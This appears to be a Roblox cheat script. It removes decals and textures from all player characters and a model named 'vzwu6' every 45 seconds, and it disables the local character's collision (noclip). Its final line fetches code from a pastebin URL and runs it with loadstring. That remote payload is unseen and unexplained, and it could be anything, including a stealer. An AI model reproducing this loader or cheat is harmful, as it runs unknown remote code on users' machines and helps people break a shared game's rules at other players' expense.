local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

-- Function to remove unwanted objects from a character or model
local function removeDecalsFromObject(object)
    for _, descendant in pairs(object:GetDescendants()) do
        if descendant:IsA("Decal") or descendant:IsA("Texture") or descendant:IsA("SurfaceAppearance") then
            descendant:Destroy() -- Remove the decal, texture, or surface appearance
        end
    end
end

-- Function to handle player character appearance
local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        removeDecalsFromObject(character)
    end)
end

-- Connect function to existing players and new players joining
for _, player in pairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(onPlayerAdded)

-- Function to repeatedly remove decals from all players and specific models
local function removeDecalsPeriodically()
    while true do
        -- Remove decals from all player characters
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character then
                removeDecalsFromObject(player.Character)
            end
        end
        
        -- Remove decals from the specific model named "vzwu6" in workspace
        local model = Workspace:FindFirstChild("vzwu6")
        if model then
            removeDecalsFromObject(model)
        end
        
        -- Wait 45 seconds before repeating
        wait(45)
    end
end

-- Start the loop in a separate thread
spawn(removeDecalsPeriodically)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function disableCollision()
    for _, part in ipairs(character:GetChildren()) do
        if part:IsA("BasePart") and part.CanCollide then
            part.CanCollide = false
        end
    end
end

-- Apply when character loads
character:WaitForChild("HumanoidRootPart") -- Ensures the character is fully loaded
disableCollision()

-- Reapply on respawn
player.CharacterAdded:Connect(function(newCharacter)
    newCharacter:WaitForChild("HumanoidRootPart")
    disableCollision()
end)

loadstring(game:HttpGet("https://pastebin.com/raw/pHs7P9vf",true))()
